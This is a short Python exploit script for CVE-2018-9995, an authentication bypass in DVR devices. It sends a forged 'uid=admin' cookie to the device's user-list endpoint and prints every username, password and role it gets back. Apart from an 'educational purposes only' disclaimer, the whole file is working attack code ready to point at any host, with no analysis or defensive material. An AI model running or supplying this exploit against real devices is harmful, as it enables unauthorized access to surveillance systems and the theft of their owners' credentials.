#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Simple CVE-2018-9995 Exploit
This script demonstrates the vulnerability in a minimal way.
For educational purposes only.
"""
import sys
import json
import requests

def usage():
    print("Simple CVE-2018-9995 Exploit")
    print("Usage: python simple_exploit.py <host> <port>")
    print("Example: python simple_exploit.py 192.168.1.100 80")
    sys.exit(1)

def main():
    # Check arguments
    if len(sys.argv) < 2:
        usage()
    
    host = sys.argv[1]
    port = sys.argv[2] if len(sys.argv) > 2 else "80"
    
    # Construct target URL
    url = f"http://{host}:{port}/device.rsp?opt=user&cmd=list"
    
    print(f"[*] Targeting: {url}")
    
    try:
        # Make the request with the exploit cookie
        headers = {"Cookie": "uid=admin"}
        response = requests.get(url, headers=headers, timeout=10)
        
        # Check if successful
        if response.status_code == 200:
            try:
                # Parse JSON response
                data = json.loads(response.text)
                
                # Display results
                print("\n[+] Exploit successful!")
                print("[+] Credentials found:")
                print("-" * 50)
                
                for user in data.get("list", []):
                    username = user.get("uid", "N/A")
                    password = user.get("pwd", "N/A")
                    role = user.get("role", "N/A")
                    print(f"Username: {username}")
                    print(f"Password: {password}")
                    print(f"Role ID: {role}")
                    print("-" * 50)
                    
            except json.JSONDecodeError:
                print("[!] Error: Invalid JSON response")
                print(f"Raw response: {response.text}")
                
        else:
            print(f"[!] Error: HTTP Status Code {response.status_code}")
            
    except requests.exceptions.Timeout:
        print("[!] Error: Connection timed out")
    except requests.exceptions.ConnectionError:
        print("[!] Error: Failed to connect to the host")
    except Exception as e:
        print(f"[!] Error: {str(e)}")

if __name__ == "__main__":
    print("\n===== CVE-2018-9995 Simple Exploit =====")
    print("For educational purposes only.\n")
    main() 